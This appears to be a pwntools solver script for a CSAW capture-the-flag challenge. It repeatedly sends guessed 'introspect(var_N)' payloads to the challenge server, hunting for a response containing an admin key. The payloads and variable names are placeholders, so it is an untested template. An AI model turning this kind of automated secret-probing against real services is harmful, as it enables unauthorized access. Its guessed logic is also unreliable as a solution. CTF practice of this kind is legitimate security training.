from pwn import *
import time

# Define server address and port
HOST = "misc.chal.csaw.io"
PORT = 9999

# Connection retry and error handling
def connect_to_server():
    while True:
        try:
            conn = remote(HOST, PORT)
            print("Connected successfully")
            return conn
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 2 seconds...")
            time.sleep(2)

# Send payload and handle server response
def send_payload(conn, payload):
    try:
        conn.sendline(payload)
        response = conn.recvline(timeout=5)  # Adjust timeout as necessary
        return response
    except EOFError:
        print("Server closed connection unexpectedly.")
        return None
    except Exception as e:
        print(f"Error while sending payload: {e}")
        return None

# Batch payload generation dynamically
def generate_batches(variable_names):
    BATCH_SIZE = 5  # Start with a default batch size
    for i in range(0, len(variable_names), BATCH_SIZE):
        yield variable_names[i:i + BATCH_SIZE]

# Introspection-based exploitation
def introspection_exploit():
    conn = connect_to_server()

    # Example, needs to tailor based on actual variables in context
    possible_variables = [f"var_{i}" for i in range(1, 100)]

    for batch in generate_batches(possible_variables):
        for variable in batch:
            payload = f"introspect({variable})"  # Adjust payload format per the challenge logic
            response = send_payload(conn, payload)
            if response:
                print(f"Response for {variable}: {response.strip()}")
                if b"admin_key" in response:
                    print("Admin key discovered!")
                    print(response.decode())
                    conn.close()
                    return
            else:
                print(f"No response for variable {variable}. Server might be overloaded. Retrying...")
                conn = connect_to_server()  # Reconnect if necessary

    conn.close()

if __name__ == "__main__":
    introspection_exploit()

